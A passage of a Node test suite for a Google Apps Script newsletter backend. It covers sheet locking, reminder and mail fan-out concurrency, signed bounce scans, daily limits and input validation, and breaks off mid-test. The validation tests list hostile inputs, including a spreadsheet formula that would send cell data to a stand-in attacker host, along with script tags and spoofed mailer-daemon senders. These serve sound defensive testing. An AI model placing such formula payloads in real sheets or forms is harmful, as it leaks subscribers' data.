/**
 * newsletter.gs: the actions anyone can reach, and what happens when two
 * executions touch the subscriber sheet at once. The script runs in Google's
 * Apps Script runtime, so it is loaded into a Node VM with a fake of the
 * services it uses. The fake holds the handlers to the rules that keep row
 * numbers honest:
 *   - a sheet write needs the script lock, and a read of the sheet made since
 *     the lock was taken (a row number found before the lock is stale);
 *   - writes are flushed before the lock is released;
 *   - no mail goes out while the lock is held.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import vm from 'node:vm';

const SOURCE = fs.readFileSync('scripts/newsletter.gs', 'utf8');
const HEADERS = ['email', 'status', 'source', 'created_at', 'confirmed_at', 'unsubscribed_at', 'confirm_token', 'unsub_token', 'reminder_sent_at'];
const SECRET = 'a'.repeat(64);
const DAY = 24 * 60 * 60 * 1000;
// Inside the 06:00 to 12:59 UTC reminder window.
const NOW = Date.parse('2026-11-10T09:00:00Z');
const tok = (c) => c.repeat(64);

const row = (email, status, ageDays, { confirm = '', unsub = '', reminded = '' } = {}) =>
  [email, status, '/blog/', new Date(NOW - ageDays * DAY), '', '', confirm, unsub, reminded];

/** Loads the script over `dataRows`; returns the VM context plus what the fakes recorded. */
function load(dataRows = []) {
  const rows = [HEADERS.slice(), ...dataRows.map((r) => r.slice())];
  const props = { SHEET_ID: 'sheet', SHEET_NAME: 'tab', FROM_EMAIL: 'updates@nidhi.today', HMAC_SECRET: SECRET };
  const rec = { rows, props, mails: [], locked: false, lockTakes: 0, onSend: null, uuid: 0, readInLock: false, dirty: false, refuseLock: false };

  const mustHoldLock = (what) => {
    if (!rec.locked) throw new Error(`${what} without the script lock`);
    if (!rec.readInLock) throw new Error(`${what} with no read of the sheet since the lock was taken`);
    rec.dirty = true;
  };
  const read = (value) => { rec.readInLock = true; return value; };
  const sheet = {
    getLastRow: () => read(rows.length),
    getLastColumn: () => HEADERS.length,
    getName: () => 'tab',
    appendRow: (values) => { mustHoldLock('appendRow'); rows.push(values.concat(Array(HEADERS.length).fill('')).slice(0, HEADERS.length)); },
    deleteRow: (n) => { mustHoldLock('deleteRow'); rows.splice(n - 1, 1); },
    getRange: (r, c, nr = 1, nc = 1) => ({
      getValues: () => read(rows.slice(r - 1, r - 1 + nr).map((x) => x.slice(c - 1, c - 1 + nc))),
      getValue: () => read(rows[r - 1][c - 1]),
      setValue: (v) => { mustHoldLock('setValue'); rows[r - 1][c - 1] = v; },
      setValues: (vs) => {
        mustHoldLock('setValues');
        vs.forEach((line, i) => line.forEach((v, j) => { rows[r - 1 + i][c - 1 + j] = v; }));
      },
    }),
  };

  const signed = (bytes) => [...bytes].map((b) => (b > 127 ? b - 256 : b));
  const html = () => ({ setXFrameOptionsMode() { return this; } });
  const ctx = {
    console: { error() {}, log() {}, warn() {} },
    Date: class extends Date {
      constructor(...a) { if (a.length) super(...a); else super(NOW); }
      static now() { return NOW; }
    },
    Utilities: {
      DigestAlgorithm: { SHA_256: 1 },
      Charset: { UTF_8: 1 },
      computeDigest: (_a, s) => signed(crypto.createHash('sha256').update(s).digest()),
      computeHmacSha256Signature: (data, secret) => signed(crypto.createHmac('sha256', secret).update(data).digest()),
      getUuid: () => crypto.createHash('md5').update(String(rec.uuid++)).digest('hex'),
      formatDate: (d, _tz, fmt) => (fmt === 'H' ? String(d.getUTCHours()) : d.toISOString().slice(0, 10)),
      base64EncodeWebSafe: (s) => Buffer.from(s, 'utf8').toString('base64url'),
      base64Encode: (s) => Buffer.from(s, 'utf8').toString('base64'),
    },
    ContentService: { MimeType: { JSON: 1 }, createTextOutput: (s) => ({ s, setMimeType() { return this; } }) },
    HtmlService: { XFrameOptionsMode: { ALLOWALL: 1 }, createHtmlOutput: (s) => ({ html: s, ...html() }) },
    SpreadsheetApp: {
      openById: () => ({ getSheetByName: () => sheet, getSheets: () => [sheet] }),
      flush: () => { rec.dirty = false; },
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (k in props ? props[k] : null),
        setProperty: (k, v) => { props[k] = String(v); },
        deleteProperty: (k) => { delete props[k]; },
        getProperties: () => ({ ...props }),
      }),
    },
    ScriptApp: { getService: () => ({ getUrl: () => 'https://example.invalid/exec' }) },
    LockService: {
      getScriptLock: () => ({
        // The real waitLock throws on a timeout. This one returns quietly when
        // told to refuse, so the handlers' own hasLock check is what is tested.
        waitLock: () => {
          if (rec.refuseLock) return;
          if (rec.locked) throw new Error('lock taken twice');
          rec.locked = true;
          rec.readInLock = false;
          rec.lockTakes++;
        },
        hasLock: () => rec.locked,
        releaseLock: () => {
          if (rec.dirty) throw new Error('lock released before the sheet writes were flushed');
          rec.locked = false;
        },
      }),
    },
    Gmail: {
      Users: {
        Messages: {
          send: ({ raw }) => {
            if (rec.locked) throw new Error('mail sent while holding the script lock');
            const mime = Buffer.from(raw, 'base64url').toString('utf8');
            const to = /^To: (.*)$/m.exec(mime)[1].trim();
            if (rec.onSend) rec.onSend(to, mime);
            rec.mails.push(to);
          },
        },
        Settings: { SendAs: { list: () => ({ sendAs: [{ sendAsEmail: 'updates@nidhi.today', verificationStatus: 'accepted' }] }) } },
        getProfile: () => ({ emailAddress: 'updates@nidhi.today' }),
      },
    },
    GmailApp: { search: () => [], getAliases: () => ['updates@nidhi.today'] },
    Session: { getEffectiveUser: () => ({ getEmail: () => 'updates@nidhi.today' }) },
    UrlFetchApp: { fetch: () => ({}) },
  };
  vm.createContext(ctx);
  vm.runInContext(SOURCE, ctx);
  ctx.rec = rec;
  return ctx;
}

const req = (fields, body = '') => ({ parameter: fields, postData: { contents: body } });
const json = (out) => JSON.parse(out.s);
const emails = (ctx) => ctx.rec.rows.slice(1).map((r) => r[0]);
const find = (ctx, email) => ctx.rec.rows.find((r) => r[0] === email);
const sign = (data) => crypto.createHmac('sha256', SECRET).update(data).digest('hex');

describe('newsletter.gs: no public reminder test', () => {
  const pending = [row('p@x.io', 'pending', 1, { confirm: tok('1'), unsub: tok('2') })];

  for (const [name, call] of [['POST', 'doPost'], ['GET', 'doGet']]) {
    it(`${name} action=test_remind sends nothing and says nothing about the address`, () => {
      const ctx = load(pending);
      const known = ctx[call](req({ action: 'test_remind', email: 'p@x.io' }));
      const unknown = ctx[call](req({ action: 'test_remind', email: 'nobody@x.io' }));
      assert.deepEqual(ctx.rec.mails, []);
      assert.deepEqual(known.s ?? known.html, unknown.s ?? unknown.html);
      if (name === 'POST') assert.deepEqual(json(known), { ok: false, error: 'unknown_action' });
    });
  }

  it('routes only the actions that are meant to be public', () => {
    const actions = [...SOURCE.matchAll(/if \(action === '([a-z_]+)'\)/g)].map((m) => m[1]);
    assert.deepEqual([...new Set(actions)].sort(), [
      'confirm', 'count', 'health', 'remind_pending', 'scan_bounces', 'send_post', 'subscribe', 'unsubscribe',
    ]);
  });

  it('the editor-only test still sends one reminder to a pending address', () => {
    const ctx = load(pending);
    ctx.rec.props.TEST_REMIND_EMAIL = 'P@x.io ';
    ctx.testRemindFromEditor();
    assert.deepEqual(ctx.rec.mails, ['p@x.io']);
    assert.equal(find(ctx, 'p@x.io')[8], '', 'reminder_sent_at is left alone');
    ctx.rec.props.TEST_REMIND_EMAIL = 'nobody@x.io';
    assert.throws(() => ctx.testRemindFromEditor());
    assert.equal(ctx.rec.locked, false, 'the lock is given back when the lookup fails');
  });
});

describe('newsletter.gs: sheet writes hold the lock', () => {
  it('subscribe appends a new address once, under the lock, and mails outside it', () => {
    const ctx = load();
    assert.deepEqual(json(ctx.doPost(req({ action: 'subscribe', email: 'New@x.io', source: '/blog/' }))), { ok: true });
    assert.deepEqual(emails(ctx), ['new@x.io']);
    assert.deepEqual(ctx.rec.mails, ['new@x.io']);
    assert.equal(ctx.rec.lockTakes, 1);
  });

  it('a request that cannot take the lock fails without touching the sheet', () => {
    const ctx = load([row('a@x.io', 'pending', 1, { confirm: tok('1'), unsub: tok('2') })]);
    const before = JSON.stringify(ctx.rec.rows);
    ctx.rec.refuseLock = true;
    assert.equal(json(ctx.doPost(req({ action: 'subscribe', email: 'new@x.io' }))).ok, false);
    assert.equal(json(ctx.doPost(req({ action: 'unsubscribe', t: tok('2') }))).ok, false);
    ctx.doPost(req({ action: 'confirm', t: tok('1') }));
    assert.throws(() => ctx.handleRemindPending());
    assert.equal(JSON.stringify(ctx.rec.rows), before);
    assert.deepEqual(ctx.rec.mails, []);
  });

  it('a second subscribe for the same address reuses the row', () => {
    const ctx = load([row('old@x.io', 'pending', 1, { confirm: tok('1'), unsub: tok('2') })]);
    assert.deepEqual(json(ctx.doPost(req({ action: 'subscribe', email: 'old@x.io' }))), { ok: true });
    assert.deepEqual(emails(ctx), ['old@x.io']);
    assert.notEqual(find(ctx, 'old@x.io')[6], tok('1'), 'fresh confirm token');
    assert.deepEqual(ctx.rec.mails, ['old@x.io']);
  });

  it('subscribe for a confirmed address changes nothing and sends nothing', () => {
    const ctx = load([row('c@x.io', 'confirmed', 30, { unsub: tok('2') })]);
    const before = JSON.stringify(ctx.rec.rows);
    assert.deepEqual(json(ctx.doPost(req({ action: 'subscribe', email: 'c@x.io' }))), { ok: true });
    assert.equal(JSON.stringify(ctx.rec.rows), before);
    assert.deepEqual(ctx.rec.mails, []);
  });

  it('confirm and unsubscribe write to the row their token names', () => {
    const ctx = load([
      row('a@x.io', 'pending', 1, { confirm: tok('1'), unsub: tok('2') }),
      row('b@x.io', 'pending', 1, { confirm: tok('3'), unsub: tok('4') }),
    ]);
    ctx.doPost(req({ action: 'confirm', t: tok('3') }));
    assert.equal(find(ctx, 'a@x.io')[1], 'pending');
    assert.equal(find(ctx, 'b@x.io')[1], 'confirmed');
    assert.equal(find(ctx, 'b@x.io')[6], '', 'confirm token is single-use');
    assert.deepEqual(ctx.rec.mails, ['b@x.io'], 'welcome mail');

    assert.deepEqual(json(ctx.doPost(req({ action: 'unsubscribe', t: tok('4') }))), { ok: true });
    assert.equal(find(ctx, 'b@x.io')[1], 'unsubscribed');
    assert.deepEqual(json(ctx.doPost(req({ action: 'unsubscribe', t: tok('9') }))), { ok: false, error: 'invalid_token' });
  });
});

describe('newsletter.gs: reminder run', () => {
  const sheet = () => [
    row('old1@x.io', 'pending', 8, { confirm: tok('1') }),
    row('keep@x.io', 'confirmed', 40, { unsub: tok('2') }),
    row('due1@x.io', 'pending', 4, { confirm: tok('3') }),
    row('fresh@x.io', 'pending', 1, { confirm: tok('4') }),
    row('old2@x.io', 'pending', 9, { confirm: tok('5') }),
    row('due2@x.io', 'pending', 5, { confirm: tok('6') }),
    row('done@x.io', 'pending', 5, { confirm: tok('7'), reminded: new Date(NOW - DAY) }),
  ];

  it('reminds the due rows once, deletes the expired ones and nobody else', () => {
    const ctx = load(sheet());
    const out = json(ctx.handleRemindPending());
    assert.deepEqual(out, { ok: true, reminded: 2, deleted: 2, utc_hour: 9 });
    assert.deepEqual(ctx.rec.mails, ['due1@x.io', 'due2@x.io']);
    assert.deepEqual(emails(ctx), ['keep@x.io', 'due1@x.io', 'fresh@x.io', 'due2@x.io', 'done@x.io']);
    assert.ok(find(ctx, 'due1@x.io')[8] && find(ctx, 'due2@x.io')[8]);
    assert.equal(find(ctx, 'fresh@x.io')[8], '');

    // A second run straight after finds nothing left to do.
    assert.deepEqual(json(ctx.handleRemindPending()), { ok: true, reminded: 0, deleted: 0, utc_hour: 9 });
    assert.deepEqual(ctx.rec.mails, ['due1@x.io', 'due2@x.io']);
  });

  it('a run that starts while another is sending does not mail or delete again', () => {
    const ctx = load(sheet());
    let inner;
    let started = false;
    ctx.rec.onSend = () => {
      if (started) return;
      started = true;
      inner = json(ctx.handleRemindPending());
    };
    const outer = json(ctx.handleRemindPending());
    // The second run found the first reader claimed and took the other one;
    // the first run then found that one claimed. One mail each, in total.
    assert.deepEqual(inner, { ok: true, reminded: 1, deleted: 0, utc_hour: 9 });
    assert.deepEqual(outer, { ok: true, reminded: 1, deleted: 2, utc_hour: 9 });
    assert.deepEqual(ctx.rec.mails.slice().sort(), ['due1@x.io', 'due2@x.io']);
    assert.deepEqual(emails(ctx), ['keep@x.io', 'due1@x.io', 'fresh@x.io', 'due2@x.io', 'done@x.io']);
  });

  it('rows that move while mail is going out are not written to by number', () => {
    const ctx = load(sheet());
    // While the first reminder is being sent, the reader above confirms and
    // a new reader subscribes: every later row number is now different.
    ctx.rec.onSend = (to) => {
      if (to !== 'due1@x.io') return;
      ctx.rec.onSend = null;
      ctx.doPost(req({ action: 'unsubscribe', t: tok('2') }));
      ctx.rec.rows.splice(1, 1); // the owner deletes a row by hand
      ctx.doPost(req({ action: 'subscribe', email: 'late@x.io' }));
    };
    ctx.handleRemindPending();
    assert.deepEqual(emails(ctx), ['due1@x.io', 'fresh@x.io', 'due2@x.io', 'done@x.io', 'late@x.io']);
    assert.equal(find(ctx, 'fresh@x.io')[8], '');
    assert.equal(find(ctx, 'late@x.io')[1], 'pending');
    assert.equal(find(ctx, 'late@x.io')[8], '');
  });

  it('a reminder that fails to send is tried again next run, unless the reader moved on', () => {
    const ctx = load(sheet());
    ctx.rec.onSend = (to) => { if (to === 'due1@x.io') throw new Error('gmail down'); };
    assert.equal(json(ctx.handleRemindPending()).reminded, 1);
    assert.equal(find(ctx, 'due1@x.io')[8], '', 'claim given back');
    ctx.rec.onSend = null;
    assert.equal(json(ctx.handleRemindPending()).reminded, 1);
    assert.deepEqual(ctx.rec.mails, ['due2@x.io', 'due1@x.io']);

    const again = load(sheet());
    again.rec.onSend = (to) => {
      if (to !== 'due1@x.io') return;
      again.rec.onSend = null;
      again.doPost(req({ action: 'confirm', t: tok('3') }));
      throw new Error('gmail down');
    };
    again.handleRemindPending();
    assert.equal(find(again, 'due1@x.io')[1], 'confirmed');
    assert.ok(find(again, 'due1@x.io')[8], 'a confirmed row is left as it is');
  });

  it('claims one reader at a time, so a run that is cut off loses no one else', () => {
    const ctx = load(sheet());
    const stamped = [];
    ctx.rec.onSend = () => {
      stamped.push(ctx.rec.rows.slice(1).filter((r) => r[1] === 'pending' && r[8]).map((r) => r[0]));
    };
    ctx.handleRemindPending();
    // When the first mail went out, the second reader had not been claimed.
    assert.deepEqual(stamped, [['due1@x.io', 'done@x.io'], ['due1@x.io', 'due2@x.io', 'done@x.io']]);
  });

  it('stops taking readers when its time is up and leaves them for the next run', () => {
    const ctx = load(sheet());
    let clock = NOW;
    ctx.Date.now = () => clock;
    ctx.rec.onSend = () => { clock += 5 * 60 * 1000; };
    const out = json(ctx.handleRemindPending());
    assert.deepEqual([out.reminded, out.left_for_next_run], [1, 1]);
    assert.equal(find(ctx, 'due2@x.io')[8], '', 'still due');
    ctx.rec.onSend = null;
    clock = NOW;
    assert.equal(json(ctx.handleRemindPending()).reminded, 1);
    assert.deepEqual(ctx.rec.mails, ['due1@x.io', 'due2@x.io']);
  });

  it('reminds a due row whose address also sits on an earlier row', () => {
    // An older sheet can hold one address twice (two subscribes that raced).
    const ctx = load([
      row('twice@x.io', 'confirmed', 40, { unsub: tok('1') }),
      row('twice@x.io', 'pending', 4, { confirm: tok('2') }),
      row('again@x.io', 'pending', 5, { confirm: tok('3'), reminded: new Date(NOW - DAY) }),
      row('again@x.io', 'pending', 4, { confirm: tok('4') }),
    ]);
    assert.equal(json(ctx.handleRemindPending()).reminded, 2);
    assert.deepEqual(ctx.rec.mails, ['twice@x.io', 'again@x.io']);
    assert.equal(ctx.rec.rows[1][8], '', 'the confirmed row is not stamped');
    assert.ok(ctx.rec.rows[2][8] && ctx.rec.rows[4][8], 'the due rows are');
  });

  it('does nothing outside the sending hours', () => {
    const ctx = load(sheet());
    vm.runInContext("Utilities.formatDate = function () { return '3'; };", ctx);
    assert.deepEqual(json(ctx.handleRemindPending()), { ok: true, skipped: 'outside_window', utc_hour: 3 });
    assert.equal(ctx.rec.rows.length, 8);
  });
});

describe('newsletter.gs: one fan-out per lesson', () => {
  const body = JSON.stringify({ guid: 'https://nidhi.today/blog/x/', subject: 'S', html: '<p>{{UNSUBSCRIBE_URL}}</p>', text: 't', url: 'u' });
  const send = (ctx) => json(ctx.doPost(req({ action: 'send_post', sig: sign(body) }, body)));
  const list = () => [
    row('b@x.io', 'confirmed', 30, { unsub: tok('1') }),
    row('a@x.io', 'confirmed', 30, { unsub: tok('2') }),
    row('B@x.io', 'confirmed', 30, { unsub: tok('3') }),
    row('p@x.io', 'pending', 1, { confirm: tok('4'), unsub: tok('5') }),
  ];

  it('mails each confirmed address once, then answers already_sent', () => {
    const ctx = load(list());
    assert.deepEqual(send(ctx), { ok: true, sent: 2, failed: 0, skipped_already_sent: 0 });
    assert.deepEqual(ctx.rec.mails, ['a@x.io', 'b@x.io']);
    assert.equal(send(ctx).skipped, 'already_sent');
    assert.equal(Object.keys(ctx.rec.props).some((k) => k.startsWith('sending:')), false, 'claim released');
  });

  it('a second call for the same lesson during a send is told to come back', () => {
    const ctx = load(list());
    let inner;
    let started = false;
    ctx.rec.onSend = () => {
      if (started) return;
      started = true;
      inner = send(ctx);
    };
    const outer = send(ctx);
    assert.deepEqual(inner, { ok: true, sent: 0, failed: 0, partial: true, in_progress: true });
    assert.equal(outer.sent, 2);
    assert.deepEqual(ctx.rec.mails, ['a@x.io', 'b@x.io']);
  });

  it('a claim left by a run that died is taken over', () => {
    const ctx = load(list());
    ctx.rec.props['sending:https://nidhi.today/blog/x/'] = `${NOW - 8 * 60 * 1000}:dead`;
    assert.equal(send(ctx).sent, 2);
  });

  it('a run that was taken over does not release the newer claim', () => {
    const ctx = load(list());
    const key = 'sending:https://nidhi.today/blog/x/';
    ctx.rec.onSend = () => { ctx.rec.props[key] = `${NOW}:the-run-that-took-over`; };
    send(ctx);
    assert.equal(ctx.rec.props[key], `${NOW}:the-run-that-took-over`);
  });

  it('a bad signature sends nothing', () => {
    const ctx = load(list());
    assert.deepEqual(json(ctx.doPost(req({ action: 'send_post', sig: 'f'.repeat(64) }, body))), { ok: false, error: 'bad_signature' });
    assert.deepEqual(ctx.rec.mails, []);
  });
});

describe('newsletter.gs: bounce scan', () => {
  const TS = String(Math.floor(NOW / 1000));
  const scan = (ctx, ts = TS, sig = sign(`scan_bounces:${ts}`)) => json(ctx.doGet(req({ action: 'scan_bounces', ts, sig })));
  const subscribers = () => [
    row('a@x.io', 'confirmed', 30, { unsub: tok('1') }),
    row('gone@x.io', 'confirmed', 30, { unsub: tok('2') }),
    row('waiting@x.io', 'pending', 2, { confirm: tok('3'), unsub: tok('4') }),
  ];
  // A delivery failure report as Google writes it, about a mail this script sent.
  const report = (to, { from = 'Mail Delivery Subsystem <mailer-daemon@googlemail.com>', action = 'failed', status = '5.1.1', list = 'nidhi blog newsletter <newsletter.nidhi.today>', ageDays = 1, extra = '' } = {}) => ({
    getFrom: () => from,
    getDate: () => new Date(NOW - ageDays * DAY),
    getRawContent: () => [
      `From: ${from}`, 'Subject: Delivery Status Notification (Failure)', `X-Failed-Recipients: ${to}`, '',
      'Address not found', extra, '',
      'Content-Type: message/delivery-status', '',
      `Final-Recipient: rfc822; ${to}`, `Action: ${action}`, `Status: ${status}`, '',
      'Content-Type: message/rfc822', '', `List-ID: ${list}`, `To: ${to}`,
    ].join('\r\n'),
  });
  const inbox = (ctx, ...messages) => { ctx.GmailApp.search = (_q, start) => (start === 0 ? messages.map((m) => ({ getMessages: () => [m] })) : []); };

  it('marks the address a permanent failure report names, confirmed or still pending', () => {
    const ctx = load(subscribers());
    ctx.rec.props.SITE_URL = 'https://nidhi.today';
    inbox(ctx, report('gone@x.io'), report('Waiting@x.io'));
    const out = scan(ctx);
    assert.equal(out.marked_bounced, 2);
    assert.equal(find(ctx, 'gone@x.io')[1], 'bounced');
    assert.equal(find(ctx, 'waiting@x.io')[1], 'bounced');
    assert.equal(find(ctx, 'a@x.io')[1], 'confirmed');
  });

  it('asks Gmail only for reports from Google’s delivery subsystem', () => {
    const ctx = load(subscribers());
    let asked = '';
    ctx.GmailApp.search = (q) => { asked = q; return []; };
    scan(ctx);
    assert.equal(asked, 'in:inbox from:mailer-daemon@googlemail.com newer_than:14d');
  });

  for (const [what, message] of [
    ['a message from anyone else with that subject and a list of addresses', { from: 'Someone <someone@example.com>' }],
    ['a sender whose name merely says mailer-daemon', { from: 'mailer-daemon <attacker@example.com>' }],
    ['a look-alike sender address', { from: 'mailer-daemon@googlemail.com.example.org' }],
    ['a delay notice', { action: 'delayed', status: '4.4.1' }],
    ['a temporary failure such as a full mailbox', { status: '4.2.2' }],
    ['a failure of mail that was not this newsletter’s', { list: '' }],
    ['a report older than the reader’s sign-up', { ageDays: 40 }],
  ]) {
    it(`ignores ${what}`, () => {
      const ctx = load(subscribers());
      ctx.rec.props.SITE_URL = 'https://nidhi.today';
      inbox(ctx, report('gone@x.io', message));
      assert.equal(scan(ctx).marked_bounced, 0);
      assert.equal(find(ctx, 'gone@x.io')[1], 'confirmed');
    });
  }

  it('ignores an address that a report only mentions', () => {
    const ctx = load(subscribers());
    ctx.rec.props.SITE_URL = 'https://nidhi.today';
    inbox(ctx, report('stranger@elsewhere.io', { extra: 'cc: a@x.io, gone@x.io <gone@x.io>' }));
    assert.equal(scan(ctx).marked_bounced, 0);
  });

  it('reads every page of reports', () => {
    const ctx = load(subscribers());
    ctx.rec.props.SITE_URL = 'https://nidhi.today';
    const filler = Array.from({ length: 100 }, () => ({ getMessages: () => [report('nobody@elsewhere.io')] }));
    const starts = [];
    ctx.GmailApp.search = (_q, start) => { starts.push(start); return start === 0 ? filler : start === 100 ? [{ getMessages: () => [report('gone@x.io')] }] : []; };
    assert.equal(scan(ctx).marked_bounced, 1);
    assert.deepEqual(starts, [0, 100]);
  });

  it('needs a signature over the action and the time, made within five minutes', () => {
    const ctx = load(subscribers());
    assert.equal(scan(ctx).ok, true);
    const late = String(Math.floor(NOW / 1000) - 301);
    const early = String(Math.floor(NOW / 1000) + 301);
    for (const [ts, sig] of [
      [TS, sign('scan_bounces')], // the old fixed signature, as seen in a log
      [late, sign(`scan_bounces:${late}`)],
      [early, sign(`scan_bounces:${early}`)],
      [TS, sign(`scan_bounces:${late}`)],
      ['', sign('scan_bounces:')],
      ['not-a-time', sign('scan_bounces:not-a-time')],
      [TS, 'f'.repeat(64)],
    ]) {
      assert.deepEqual(scan(ctx, ts, sig), { ok: false, error: 'bad_signature' }, `${ts} ${sig.slice(0, 8)}`);
    }
    const edge = String(Math.floor(NOW / 1000) - 299);
    assert.equal(scan(ctx, edge, sign(`scan_bounces:${edge}`)).ok, true);
  });

  it('says nothing about why the inbox could not be read', () => {
    const ctx = load(subscribers());
    ctx.GmailApp.search = () => { throw new Error('Service invoked too many times for one day: gmail (updates@nidhi.today)'); };
    assert.deepEqual(scan(ctx), { ok: false, error: 'gmail_search_failed' });
  });
});

describe('newsletter.gs: what a request can make it write, send or say', () => {
  const sub = (ctx, fields) => json(ctx.doPost(req({ action: 'subscribe', ...fields })));

  it('a repeat within six hours sends no second mail and keeps the first link working', () => {
    const ctx = load();
    assert.deepEqual(sub(ctx, { email: 'new@x.io' }), { ok: true });
    const first = find(ctx, 'new@x.io')[6];
    for (let i = 0; i < 5; i++) assert.deepEqual(sub(ctx, { email: 'new@x.io' }), { ok: true });
    assert.deepEqual(ctx.rec.mails, ['new@x.io']);
    assert.equal(find(ctx, 'new@x.io')[6], first);
    assert.deepEqual(emails(ctx), ['new@x.io']);
    // Five hours on: still inside the window.
    const young = load([row('p@x.io', 'pending', 5 / 24, { confirm: tok('1'), unsub: tok('2') })]);
    sub(young, { email: 'p@x.io' });
    assert.deepEqual([young.rec.mails, find(young, 'p@x.io')[6]], [[], tok('1')]);
    // Seven hours on: a new mail, with a new link.
    const old = load([row('p@x.io', 'pending', 7 / 24, { confirm: tok('1'), unsub: tok('2') })]);
    sub(old, { email: 'p@x.io' });
    assert.deepEqual(old.rec.mails, ['p@x.io']);
    assert.notEqual(find(old, 'p@x.io')[6], tok('1'));
  });

  it('past the day’s limit a request changes nothing: no row, no mail, and a waiting reader’s link still works', () => {
    const ctx = load([row('waiting@x.io', 'pending', 1, { confirm: tok('1'), unsub: tok('2') })]);
    vm.runInContext('MAX_CONFIRMATIONS_PER_DAY_ = 2;', ctx);
    for (const email of ['a@x.io', 'b@x.io', 'c@x.io', 'd@x.io']) assert.deepEqual(sub(ctx, { email }), { ok: true });
    assert.deepEqual(ctx.rec.mails, ['a@x.io', 'b@x.io']);
    assert.deepEqual(emails(ctx), ['waiting@x.io', 'a@x.io', 'b@x.io']);
    // Someone else submits the waiting reader's address after the limit: their row is untouched.
    const before = JSON.stringify(find(ctx, 'waiting@x.io'));
    assert.deepEqual(sub(ctx, { email: 'waiting@x.io' }), { ok: true });
    assert.equal(JSON.stringify(find(ctx, 'waiting@x.io')), before);
    ctx.doPost(req({ action: 'confirm', t: tok('1') }));
    assert.equal(find(ctx, 'waiting@x.io')[1], 'confirmed');
  });

  it('the limit is per UTC day: the next day starts from nothing and drops the old count', () => {
    const ctx = load();
    vm.runInContext('MAX_CONFIRMATIONS_PER_DAY_ = 1;', ctx);
    sub(ctx, { email: 'a@x.io' });
    sub(ctx, { email: 'b@x.io' });
    assert.deepEqual(ctx.rec.mails, ['a@x.io']);
    assert.deepEqual(Object.keys(ctx.rec.props).filter((k) => k.startsWith('confirm_mails:')), ['confirm_mails:2026-11-10']);
    // The script's clock moves to the next day.
    const next = NOW + DAY;
    vm.runInContext(`Date = class extends Date { constructor(...a) { if (a.length) super(...a); else super(${next}); } static now() { return ${next}; } };`, ctx);
    sub(ctx, { email: 'b@x.io' });
    assert.deepEqual(ctx.rec.mails, ['a@x.io', 'b@x.io']);
    assert.deepEqual(Object.keys(ctx.rec.props).filter((k) => k.startsWith('confirm_mails:')), ['confirm_mails:2026-11-11']);
  });

  it('a request that waited for the lock across midnight counts against the new day and wipes nothing', () => {
    const ctx = load();
    vm.runInContext('MAX_CONFIRMATIONS_PER_DAY_ = 2;', ctx);
    // The clock passes midnight while the request waits for the lock: it
    // arrived on Nov 10, and takes the lock on Nov 11.
    const midnight = Date.parse('2026-11-11T00:00:00Z');
    const lock = ctx.LockService.getScriptLock;
    let clock = midnight - 1000;
    vm.runInContext('Date = class extends Date { constructor(...a) { if (a.length) super(...a); else super(clock()); } static now() { return clock(); } };', Object.assign(ctx, { clock: () => clock }));
    ctx.LockService.getScriptLock = () => { const l = lock(); const wait = l.waitLock; l.waitLock = () => { clock = midnight + 1000; wait(); }; return l; };
    ctx.rec.props['confirm_mails:2026-11-11'] = '1'; // someone was already counted today
    sub(ctx, { email: 'late@x.io' });
    assert.equal(ctx.rec.props['confirm_mails:2026-11-11'], '2', 'counted against the day the lock was taken');
    assert.equal('confirm_mails:2026-11-10' in ctx.rec.props, false);
    sub(ctx, { email: 'over@x.io' });
    assert.deepEqual(ctx.rec.mails, ['late@x.io'], 'the limit of 2 holds');
  });

  it('two days of confirmations, reminders and welcomes leave room for a lesson', () => {
    const ctx = load();
    const [confirmations, reminders, welcomes, quota] = ['MAX_CONFIRMATIONS_PER_DAY_', 'MAX_REMINDERS_PER_DAY_', 'MAX_WELCOMES_PER_DAY_', 'QUOTA_DAILY_RECIPIENTS'].map((name) => vm.runInContext(name, ctx));
    assert.ok(2 * (confirmations + reminders + welcomes) + 900 <= quota, `2 x ${confirmations + reminders + welcomes} + a list of 900 must fit in ${quota}`);
  });

  it('reminders stop at their own daily limit, and the readers left out are reminded by a later run', () => {
    const due = ['a@x.io', 'b@x.io', 'c@x.io'].map((email, i) => row(email, 'pending', 4, { confirm: tok(String(i + 1)) }));
    const ctx = load(due);
    vm.runInContext('MAX_REMINDERS_PER_DAY_ = 2;', ctx);
    assert.equal(json(ctx.handleRemindPending()).reminded, 2);
    assert.deepEqual(ctx.rec.mails, ['a@x.io', 'b@x.io']);
    assert.equal(find(ctx, 'c@x.io')[8], '', 'not stamped, so still due');
    // The same day: nothing more. The next day: the one left out.
    assert.equal(json(ctx.handleRemindPending()).reminded, 0);
    const next = NOW + DAY;
    vm.runInContext(`Date = class extends Date { constructor(...a) { if (a.length) super(...a); else super(${next}); } static now() { return ${next}; } };`, ctx);
    assert.equal(json(ctx.handleRemindPending()).reminded, 1);
    assert.deepEqual(ctx.rec.mails, ['a@x.io', 'b@x.io', 'c@x.io']);
  });

  it('welcome mails stop at their own daily limit; the reader is confirmed all the same', () => {
    const ctx = load([
      row('a@x.io', 'pending', 1, { confirm: tok('1'), unsub: tok('2') }),
      row('b@x.io', 'pending', 1, { confirm: tok('3'), unsub: tok('4') }),
    ]);
    vm.runInContext('MAX_WELCOMES_PER_DAY_ = 1;', ctx);
    ctx.doPost(req({ action: 'confirm', t: tok('1') }));
    ctx.doPost(req({ action: 'confirm', t: tok('3') }));
    assert.deepEqual(ctx.rec.mails, ['a@x.io']);
    assert.deepEqual([find(ctx, 'a@x.io')[1], find(ctx, 'b@x.io')[1]], ['confirmed', 'confirmed']);
  });

  it('keeps only a site path as the source', () => {
    const ctx = load();
    const cases = [
      ['a@x.io', '/blog/a-lesson/', '/blog/a-lesson/'],
      ['b@x.io', '/hi/free/loan-comparison/', '/hi/free/loan-comparison/'],
      ['c@x.io', '=IMPORTDATA("https://attacker.example/?"&A2)', ''],
      ['d@x.io', '+1+1', ''],
      ['e@x.io', '@SUM(A1:A9)', ''],
      ['f@x.io', '/blog/?q=<script>', ''],
      ['g@x.io', `/${'a'.repeat(300)}`, ''],
      ['h@x.io', 'https://example.com/', ''],
      ['i@x.io', undefined, ''],
      ['j@x.io', '/blog/\n', ''],
      ['k@x.io', '/blog/\r\n=1+1', ''],
    ];
    for (const [email, source] of cases) sub(ctx, { email, source });
    for (const [email, , kept] of cases) assert.equal(find(ctx, email)[2], kept, String(email));
  });

  it('refuses an address that a spreadsheet would read as a formula, or that is not one address', () => {
    const ctx = load();
    for (const email of [
